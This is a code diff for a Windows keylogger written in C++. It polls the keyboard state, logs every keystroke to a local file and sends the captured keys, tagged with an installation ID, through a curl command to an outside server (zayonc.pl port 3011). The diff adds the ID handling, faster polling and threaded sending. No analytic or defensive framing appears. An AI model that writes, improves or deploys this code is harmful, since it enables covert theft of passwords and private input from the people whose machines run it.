@@ -15,7 +15,7 @@ using namespace std;
 void save(string input) {
 	cout << input << ", ";
 	fstream LogFile;
-	LogFile.open("dat.txt", fstream::app);
+	LogFile.open("local.log", fstream::app);
 	if (LogFile.is_open()) {
 		LogFile << input;
 		LogFile.close();
@@ -26,6 +26,24 @@ void save(char input) {
 	string str = "";
 	str += input;
 	save(str);
+}
+
+
+string readID() {
+	string id = "";
+	try
+	{
+		ifstream idFile("id.txt");
+		if (idFile.is_open()) {
+			idFile >> id;
+			idFile.close();
+		}
+	}
+	catch (const std::exception&)
+	{
+		id = "";
+	}
+	return id;
 }
 
 
@@ -113,36 +131,53 @@ string url_encode(const string& value) {
 }
 
 
+void tryToSend(string* log, string id) {
+
+	string beforeIsSend = *log;
+	string req = "curl \"http://zayonc.pl:3011/log?";
+	req += "id=" + id + "&";
+	req += "log=" + url_encode(beforeIsSend) + '\"';
+
+	cout << req << "\n";
+
+	if (!system(req.c_str())) {
+
+		int from = beforeIsSend.length();
+		int to = log->length();
+
+		*log = log->substr(0, log->length() - beforeIsSend.length());
+	}
+}
+
 
 int main()
 {
 	ShowWindow(GetConsoleWindow(), SW_SHOW);
 
 	string log = "";
+	string installationID = readID();
 
 	time_t lastUpdate;
 	time(&lastUpdate);
 
-
 	while (true) {
-		Sleep(10);
+		Sleep(4);
 		for (unsigned char key = 8; key <= 165; key++)
 		{
 			if (GetAsyncKeyState(key) == -32767) {
 
+				if (log == "")
+					time(&lastUpdate);
+
 				save(parseToString(key));
 				log += parseToString(key);
-
 			}
 		}
 
-		if (time(NULL) - lastUpdate >= 3) {
-			string req = "curl http://zayonc.pl:3011/log?log=" + url_encode(log);
-
-			if (!system(req.c_str())) {
-				time(&lastUpdate);
-				log = "";
-			}
+		if (log != "" && time(NULL) - lastUpdate >= 1) {
+			thread th(tryToSend, &log, installationID);
+			th.detach();
+			time(&lastUpdate);
 		}
 
 	}
